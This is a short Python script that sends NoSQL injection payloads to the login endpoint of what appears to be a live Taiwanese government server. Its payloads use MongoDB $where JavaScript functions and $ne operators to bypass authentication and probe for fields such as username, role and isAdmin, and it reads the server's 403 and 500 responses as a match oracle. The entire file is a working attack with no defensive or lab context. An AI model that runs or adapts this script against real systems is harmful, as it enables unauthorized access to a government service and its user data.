import requests, json, urllib3, time
urllib3.disable_warnings()
BASE="https://epcr.tpf.gov.tw:4004"
def login(body,tag):
    s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
    s.get(BASE+"/captcha",timeout=12)
    try:
        r=s.post(BASE+"/login",json=body,timeout=12); return r.status_code, r.text
    except Exception as e: return None, repr(e)

print("=== $where 过滤 source (403=匹配到, 500=空) ===")
where_tests=[
  "this.source=='PORTAL'",
  "this.source=='WEB'",
  "this.source=='API'",
  "this.source=='SYSTEM'",
  "this.source=='TPF'",
  "this.source!='null'",
  "this.source!=null",
  "this.username=='admin'",
  "this.username!=null",
  "this.role=='admin'",
  "this.isAdmin==true",
  "this.source",
]
for w in where_tests:
    b={"username":{"$where":f"function(){{{w}}}"},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"}
    code,t=login(b,w)
    mark=" ***" if code in (200,302) else ""
    print(f"  $where {w:26s} -> {code} | {t[:50]}{mark}")
    time.sleep(0.1)
print("DONE")
